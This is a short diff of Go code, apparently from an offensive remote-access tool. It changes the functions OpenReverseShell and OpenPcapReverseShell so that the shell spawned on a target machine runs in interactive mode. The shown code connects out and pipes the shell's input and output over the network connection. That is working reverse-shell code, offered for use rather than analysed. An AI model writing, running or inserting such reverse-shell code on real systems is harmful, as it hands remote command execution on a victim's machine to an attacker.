@@ -29,7 +29,7 @@ func OpenReverseShell(ip, port string) error {
 	}
 	defer conn.Close() // Close connection when function returns
 
-	cmd := exec.Command(getShell())
+	cmd := exec.Command(getShell(), "-i")
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	cmd.Stderr = conn
@@ -111,5 +111,5 @@ func OpenPcapReverseShell(msg *message.Message) error {
 		conn.Close()
 	}()
 
-	return runPcapShell(exec.Command(getShell()), conn)
+	return runPcapShell(exec.Command(getShell(), "-i"), conn)
 }
